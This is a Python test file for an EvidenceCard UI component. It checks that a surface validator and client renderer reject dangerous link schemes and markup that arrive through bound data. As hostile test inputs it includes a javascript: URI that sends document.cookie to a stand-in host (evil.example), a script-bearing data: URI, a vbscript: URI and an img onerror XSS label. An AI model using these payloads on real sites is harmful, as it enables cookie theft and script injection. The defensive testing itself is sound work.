"""EvidenceCard: a sourced claim, and the scheme wall that has to come with it.

S13 retrieval returns evidence envelopes carrying text, a source URI and a
score, and asks the answering worker to label each claim stated, derived or
inferred. The catalog had no way to render that, so a surface could only
flatten provenance into prose.

Adding the component opens a hole nothing else in the catalog opens. Every
other property is checked as a literal value, but a binding property carries
only a JSON Pointer, so the data it resolves to was never inspected. The moment
a component turns resolved data into a link, that data becomes an execution
path. These tests pin the component and the wall together.
"""

from __future__ import annotations

import re
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).parent.parent))

from s13code.ui.catalog import COMPONENTS, catalog_manifest
from s13code.ui.validator import validate_surface

CLIENT = Path(__file__).parent.parent / "s13code" / "ui" / "client" / "app.html"


def surface(sources, *, stance="stated", claim="Berlin and Paris are the closest pair."):
    """One EvidenceCard bound to the given source records."""
    return {
        "root": "ev",
        "components": [
            {
                "id": "ev",
                "type": "EvidenceCard",
                "claim": {"$bind": "/claim"},
                "stance": stance,
                "sources": {"$bind": "/sources"},
                "score": {"$bind": "/score"},
            }
        ],
        "dataModel": {"claim": claim, "sources": sources, "score": 0.82},
    }


HTTP_SOURCE = [{"uri": "https://en.wikipedia.org/wiki/Berlin", "label": "Berlin"}]


# --- the component exists and is declared honestly --------------------------

def test_evidence_card_is_in_the_catalog_as_a_custom_extension():
    spec = COMPONENTS["EvidenceCard"]
    assert spec.source == "custom"
    assert set(spec.props) == {"claim", "stance", "sources", "score"}


def test_stance_is_the_s13_vocabulary_and_nothing_else():
    values = COMPONENTS["EvidenceCard"].props["stance"].values
    assert set(values) == {"stated", "derived", "inferred"}


def test_sources_is_its_own_kind_not_a_plain_binding():
    """The distinct kind is what tells the validator to inspect resolved data."""
    assert COMPONENTS["EvidenceCard"].props["sources"].kind == "sources"
    assert COMPONENTS["EvidenceCard"].props["claim"].kind == "binding"


def test_manifest_publishes_the_component_to_the_client():
    m = catalog_manifest()
    assert m["components"]["EvidenceCard"]["source"] == "custom"
    assert m["components"]["EvidenceCard"]["props"]["sources"]["kind"] == "sources"
    assert set(m["components"]["EvidenceCard"]["props"]["stance"]["values"]) == {
        "stated", "derived", "inferred"
    }


# --- it accepts what it should ----------------------------------------------

def test_well_formed_card_validates_clean():
    result = validate_surface(surface(HTTP_SOURCE))
    assert result.ok, [r.as_dict() for r in result.rejections]
    assert result.accepted[0]["type"] == "EvidenceCard"


def test_file_and_mailto_sources_are_allowed():
    ok = [{"uri": "file:///corpus/attention.txt", "label": "attention.txt"},
          {"uri": "mailto:owner@example.com", "label": "owner"}]
    assert validate_surface(surface(ok)).ok


def test_unbound_sources_are_tolerated_and_render_empty():
    """A pointer that resolves to nothing is not an attack, just an empty list."""
    s = surface(HTTP_SOURCE)
    del s["dataModel"]["sources"]
    assert validate_surface(s).ok


# --- the attack: a URL smuggled through the data model ----------------------

def test_javascript_uri_in_a_source_is_refused():
    """The attack this component makes possible, and the reason for the wall.

    The surface is clean: every property is a well-formed pointer, and the
    literal-value checks that guard every other component see nothing wrong.
    The payload lives in the data model, which is exactly where retrieved
    documents and remote agents put things.
    """
    hostile = [{"uri": "javascript:fetch('https://evil.example/'+document.cookie)",
                "label": "Source [1]"}]
    result = validate_surface(surface(hostile))
    assert not result.ok
    r = result.rejections[0]
    assert r.component_id == "ev"
    assert r.field == "sources"
    assert r.invariant == "data-not-code"
    assert "not an allowed scheme" in r.reason
    # and the poisoned component never reaches the client
    assert result.accepted == []


def test_data_and_vbscript_uris_are_refused_too():
    for uri in ("data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
                "vbscript:msgbox(1)",
                "  javascript:alert(1)"):
        result = validate_surface(surface([{"uri": uri, "label": "x"}]))
        assert not result.ok, uri


def test_markup_in_a_source_label_is_refused():
    hostile = [{"uri": "https://ok.example", "label": "<img src=x onerror=alert(1)>"}]
    assert not validate_surface(surface(hostile)).ok


def test_source_without_a_uri_is_refused():
    assert not validate_surface(surface([{"label": "no uri here"}])).ok


def test_sources_must_resolve_to_a_list():
    s = surface(HTTP_SOURCE)
    s["dataModel"]["sources"] = {"uri": "https://ok.example"}
    result = validate_surface(s)
    assert not result.ok
    assert "must resolve to a list" in result.rejections[0].reason


def test_sources_must_be_a_binding_not_an_inline_literal():
    """Inline text where a binding belongs is how markup sneaks in."""
    s = surface(HTTP_SOURCE)
    s["components"][0]["sources"] = "https://ok.example"
    result = validate_surface(s)
    assert not result.ok
    assert "$bind" in result.rejections[0].reason


def test_an_invented_stance_is_refused():
    result = validate_surface(surface(HTTP_SOURCE, stance="proven"))
    assert not result.ok
    assert result.rejections[0].field == "stance"


def test_one_poisoned_card_does_not_blank_a_good_one():
    """A rejection is surgical: the safe part of a surface still renders."""
    s = surface(HTTP_SOURCE)
    s["components"].append({
        "id": "bad", "type": "EvidenceCard",
        "claim": {"$bind": "/claim"}, "stance": "inferred",
        "sources": {"$bind": "/hostile"},
    })
    s["dataModel"]["hostile"] = [{"uri": "javascript:alert(1)", "label": "x"}]
    result = validate_surface(s)
    assert [c["id"] for c in result.accepted] == ["ev"]
    assert [r.component_id for r in result.rejections] == ["bad"]


# --- the client half of the wall --------------------------------------------

def test_client_renders_evidence_card_without_innerhtml():
    """The renderer exists, and builds DOM rather than parsing a string."""
    src = CLIENT.read_text(encoding="utf-8")
    assert "EvidenceCard:" in src
    body = src[src.index("EvidenceCard:"):]
    body = body[: body.index("\n  Sparkline:") if "\n  Sparkline:" in body else 2600]
    assert "innerHTML" not in body
    assert "createElement" in body or "$(" in body


def test_client_only_linkifies_allowlisted_schemes():
    """Defence in depth: the client repeats the check before setting href."""
    src = CLIENT.read_text(encoding="utf-8")
    body = src[src.index("EvidenceCard:"):]
    body = body[:2600]
    assert re.search(r"\^\(https\?\|mailto\)", body), "client must test the scheme before a.href"
    assert "a.href=uri" in body.replace(" ", "")


def test_every_catalog_component_has_a_client_renderer():
    """Adding a type without a renderer would ship a blank component."""
    src = CLIENT.read_text(encoding="utf-8")
    for name in COMPONENTS:
        assert f"{name}:" in src, f"no client renderer for {name}"
